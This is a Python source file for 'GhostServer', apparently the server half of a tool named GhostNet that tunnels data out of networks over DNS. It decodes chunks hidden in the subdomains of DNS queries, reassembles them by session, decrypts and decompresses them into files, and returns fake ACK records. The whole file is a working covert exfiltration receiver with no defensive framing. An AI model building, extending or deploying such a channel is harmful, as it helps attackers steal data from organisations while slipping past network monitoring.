import socket
import struct
import os
import zlib
import time
import threading
from collections import defaultdict
from typing import Dict, Any

import structlog
from common import config, encryption_utils, dns_utils

# Configure structlog
structlog.configure(
    processors=[
        structlog.processors.TimeStamper(fmt="iso"),
        structlog.processors.JSONRenderer()
    ],
    logger_factory=structlog.PrintLoggerFactory(),
)
log = structlog.get_logger()

class GhostServer:
    def __init__(self, reaper_interval: int = 60, session_timeout: int = 300):
        self.domain = config.domain
        self.server_ip = config.server_ip
        self.port = config.server_port
        self.encryption_key = config.encryption_key
        
        # Session storage: session_id -> {seq_num: data}
        self.sessions = defaultdict(dict)
        # Session metadata: session_id -> {'received_last': bool, 'max_seq': int, 'last_seen': float}
        self.session_meta = defaultdict(lambda: {'received_last': False, 'max_seq': -1, 'last_seen': time.time()})
        
        self.session_timeout = session_timeout
        self.reaper_interval = reaper_interval
        self._stop_reaper = threading.Event()
        self._reaper_thread = threading.Thread(target=self._reap_sessions, daemon=True)

    def _reap_sessions(self):
        """Background task to clean up stale sessions."""
        while not self._stop_reaper.is_set():
            time.sleep(self.reaper_interval)
            now = time.time()
            stale_sessions = []
            
            for sid, meta in self.session_meta.items():
                if now - meta['last_seen'] > self.session_timeout:
                    stale_sessions.append(sid)
            
            for sid in stale_sessions:
                log.info("reaping_stale_session", session_id=sid)
                if sid in self.sessions: del self.sessions[sid]
                if sid in self.session_meta: del self.session_meta[sid]

    def parse_dns_query(self, data: bytes):
        """Minimal DNS parser to extract QNAME."""
        # Check if data is long enough for DNS header
        if len(data) < 12:
            raise ValueError("Data too short for DNS header")
            
        header = data[:12]
        idx = 12
        parts = []
        try:
            while True:
                length = data[idx]
                if length == 0:
                    break
                idx += 1
                parts.append(data[idx:idx+length].decode('utf-8', errors='ignore'))
                idx += length
            
            qname = ".".join(parts)
            idx += 1 # Skip null byte
            qtype = struct.unpack(">H", data[idx:idx+2])[0]
            return header, qname, qtype
        except (IndexError, struct.error):
            raise ValueError("Malformed DNS query")

    def build_dns_response(self, query_data: bytes, ip_address: str, qtype: int = 1):
        """Minimal DNS response builder (A or TXT record)."""
        tid = query_data[:2]
        flags = b'\x81\x80' 
        counts = struct.pack(">HHHH", 1, 1, 0, 0)
        
        # Question Section
        idx = 12
        while query_data[idx] != 0:
            idx += query_data[idx] + 1
        idx += 1 + 4
        question = query_data[12:idx]
        
        # Answer Section
        name = b'\xc0\x0c'
        rtype = struct.pack(">H", qtype)
        rclass = struct.pack(">H", 1)
        ttl = struct.pack(">I", 60)
        
        if qtype == dns_utils.QTYPE_A:
            rdlength = struct.pack(">H", 4)
            rdata = socket.inet_aton(ip_address)
        elif qtype == dns_utils.QTYPE_TXT:
            # Simple ACK text for TXT responses
            txt_data = b"ACK"
            rdlength = struct.pack(">H", len(txt_data) + 1)
            rdata = bytes([len(txt_data)]) + txt_data
        else:
            rdlength = struct.pack(">H", 0)
            rdata = b""
        
        answer = name + rtype + rclass + ttl + rdlength + rdata
        return tid + flags + counts + question + answer

    def handle_chunk(self, session_id: str, seq_num: int, data: bytes, is_last: bool):
        log.debug("chunk_received", session_id=session_id, seq_num=seq_num, is_last=is_last)
        
        self.sessions[session_id][seq_num] = data
        self.session_meta[session_id]['last_seen'] = time.time()
        
        if is_last:
            self.session_meta[session_id]['received_last'] = True
            self.session_meta[session_id]['max_seq'] = seq_num

        meta = self.session_meta[session_id]
        if meta['received_last']:
            if len(self.sessions[session_id]) == meta['max_seq'] + 1:
                log.info("reassembly_started", session_id=session_id)
                self.reassemble_file(session_id)

    def reassemble_file(self, session_id: str):
        chunks = self.sessions[session_id]
        sorted_seq = sorted(chunks.keys())
        full_data = b"".join([chunks[seq] for seq in sorted_seq])
        
        try:
            decrypted_data = encryption_utils.decrypt_data(full_data, self.encryption_key)
            decompressed_data = zlib.decompress(decrypted_data)
            
            output_filename = f"received_{session_id}.bin"
            with open(output_filename, "wb") as f:
                f.write(decompressed_data)
            
            log.info("file_saved", filename=output_filename, session_id=session_id)
            
            # Cleanup
            if session_id in self.sessions: del self.sessions[session_id]
            if session_id in self.session_meta: del self.session_meta[session_id]
            
        except Exception as e:
            log.error("reassembly_failed", session_id=session_id, error=str(e))

    def run(self):
        # Start the session reaper
        self._reaper_thread.start()
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.bind((self.server_ip, self.port))
        except PermissionError:
            log.error("bind_failed", port=self.port, reason="permission_denied")
            return

        log.info("server_started", ip=self.server_ip, port=self.port)
        
        try:
            while True:
                try:
                    data, addr = sock.recvfrom(512)
                    header, qname, qtype = self.parse_dns_query(data)
                    
                    if qtype not in [dns_utils.QTYPE_A, dns_utils.QTYPE_TXT]: 
                        continue
                    
                    try:
                        session_id, encoded_payload = dns_utils.parse_subdomain(qname, self.domain)
                        payload = dns_utils.decode_chunk(encoded_payload)
                        seq_num, chunk_data, is_last = dns_utils.parse_payload(payload)
                        
                        self.handle_chunk(session_id, seq_num, chunk_data, is_last)
                        
                        response = self.build_dns_response(data, "127.0.0.1", qtype=qtype)
                        sock.sendto(response, addr)
                        
                    except ValueError:
                        pass # Not a GhostNet query
                    except Exception as e:
                        log.error("query_processing_error", error=str(e))
                except Exception as e:
                    log.error("server_error", error=str(e))
        finally:
            self._stop_reaper.set()
            sock.close()

def main():
    server = GhostServer()
    server.run()

if __name__ == "__main__":
    main()
